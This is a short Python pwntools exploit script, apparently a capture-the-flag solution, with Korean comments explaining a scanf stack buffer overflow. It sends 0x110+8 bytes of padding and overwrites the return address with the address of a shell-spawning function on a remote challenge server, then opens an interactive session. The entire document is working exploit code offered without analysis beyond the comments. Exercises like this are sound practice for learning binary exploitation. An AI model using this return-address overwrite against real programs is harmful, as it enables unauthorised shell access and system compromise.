from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3004)

# scanf함수를 사용해서 bof취약점이 있었고
# rbp-0x110 위치부터 입력을 받으므로
# SFP부분을 덮어야하므로 0x110+8만큼 dummy를 넣고
# ret에 callMeMaybe 라는 shell을 실행시키는 함수의 주소를 덮어줌
dummy = b"A"*(0x110+8)
callMeMaybe = p64(0x400606)

payload = dummy + callMeMaybe

r.send(payload)

r.interactive()